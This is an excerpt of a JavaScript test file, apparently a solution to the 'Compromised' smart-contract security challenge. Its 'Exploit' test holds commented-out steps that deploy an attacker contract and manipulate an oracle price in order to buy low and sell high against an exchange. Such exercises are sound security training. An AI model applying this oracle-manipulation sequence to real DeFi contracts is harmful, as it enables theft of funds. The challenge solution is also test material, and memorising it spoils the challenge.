...
describe('Compromised challenge', function () {
    ...
    it('Exploit', async function () {        
        // const AttackerContractFactory = await ethers.getContractFactory('AttackerCompromised', attacker);
        
        // this.attacker = await AttackerContractFactory.deploy(this.oracle.address, this.exchange.address);

        // await this.attacker.connect(attacker).createSources();
        // //await this.attacker.connect(attacker).regAndSetPrice();
        // await this.attacker.connect(attacker).buy();

        // //await ethers.provider.send("evm_increaseTime", [3 * 24 * 60 * 60]);

        // await this.attacker.connect(attacker).putBackPrice();
        // await this.attacker.connect(attacker).sell();
